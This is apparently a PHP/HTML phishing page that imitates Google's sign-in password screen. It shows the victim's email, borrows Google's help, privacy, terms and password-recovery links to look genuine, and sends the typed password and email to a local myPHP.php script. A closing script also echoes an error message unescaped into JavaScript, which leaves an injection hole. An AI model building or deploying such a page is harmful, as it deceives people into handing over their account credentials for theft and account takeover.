<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <link rel="stylesheet" href="mystyle.css">
</head>

<body>
    <div class="container">
        <div class="left">
            <img src="./images/logo.png" alt="Logo">
            <h1 id="welcomeText">Welcome</h1>

            <div class="email-container" tabindex="0" role="link" aria-label="selected. Switch account">
                <div class="icon-container">
                    <svg class="user-icon" fill="currentColor" focusable="false" width="48px" height="48px"
                        viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path
                            d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z">
                        </path>
                    </svg>
                </div>
                <div class="email-text" id="emailDisplay">
                    <?php echo isset($_POST['email']) ? htmlspecialchars($_POST['email']) : 'Email not found'; ?>
                </div>
                <div class="dropdown-icon-container">
                    <svg class="dropdown-icon" fill="currentColor" focusable="false" width="24px" height="24px"
                        viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M7 10l5 5 5-5z"></path>
                    </svg>
                </div>
            </div>
        </div>
        <div class="right">
            <form action="myPHP.php" method="POST">
                <!-- Hidden input field to carry the email value -->
                <input type="hidden" name="email" value="<?php echo htmlspecialchars($_POST['email']); ?>">
                <div class="input-group input_box">
                    <input type="password" id="password" name="password" placeholder=" " required>
                    <label for="password" class="floating-label" id="passwordlLabel">Enter your password</label>
                </div>
                <div class="showText">
                    <input type="checkbox" id="showPassword" onclick="togglePassword()"> Show password
                </div>

                <div class="action-group">
                    <a href="https://accounts.google.com/v3/signin/challenge/selection?TL=AKeb6myUgypxYpX5eWT1-nJYGw9zE-U6fTc4d3ZEVoeEqGvY2OVeLJiA1Mn05dnZ&checkConnection=youtube%3A437&checkedDomains=youtube&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ddm=0&dsh=S-1374757856%3A1723268444625524&flowEntry=ServiceLogin&flowName=GlifWebSignIn&ifkv=Ab5oB3rbqPqD6oVYQRmlpNm9TFwEACaKZQFckUZIFRGd-ugqXF9ejL69Q64Oxk_a31FK7xx4oHgp9A&lid=7&pstMsg=1&rip=1&service=mail"
                        id="forgetPasswordLink" class="link-button">Forget password</a>
                    <button type="submit" id="nextButton" class="btn">Next</button>
                </div>
            </form>
        </div>
    </div>

    <div class="footer">
        <div class="footer-left">
            <select id="languageSelect" class="languageselected">
                <option value="en">English (United States)</option>
                <option value="es">Español (España)</option>
                <option value="fr">Français (France)</option>
                <option value="de">Deutsch (Deutschland)</option>
                <option value="zh">中文 (中国)</option>
                <option value="ja">日本語 (日本)</option>
                <option value="hi">हिन्दी (भारत)</option>
                <option value="fr-CA">Français (Canada)</option>
                <option value="de-AT">Deutsch (Österreich)</option>
                <option value="it">Italiano (Italia)</option>
                <option value="pt">Português (Brasil)</option>
                <option value="ru">Русский (Россия)</option>
            </select>
        </div>
        <div class="footer-right">
            <p id="helppravacyterms" class="helppravacyterms">
                <a href="https://support.google.com/accounts?hl=en&visit_id=638588549088823013-2287587084&rd=2&p=account_iph#topic=3382296"
                    class="link1">Help</a>
                <a href="https://policies.google.com/privacy?gl=IN&hl=en-US" class="link1">Privacy</a>
                <a href="https://policies.google.com/terms?gl=IN&hl=en-US" class="link1">Terms</a>
            </p>
        </div>
    </div>

    <script src="script.js"></script>
<script>
        // PHP से एरर मैसेज प्राप्त करें और इसे जावास्क्रिप्ट अलर्ट में दिखाएं
        <?php if (isset($errorMessage)) { ?>
        alert("<?php echo $errorMessage; ?>");
        <?php } ?>
    </script>
</body>

</html>
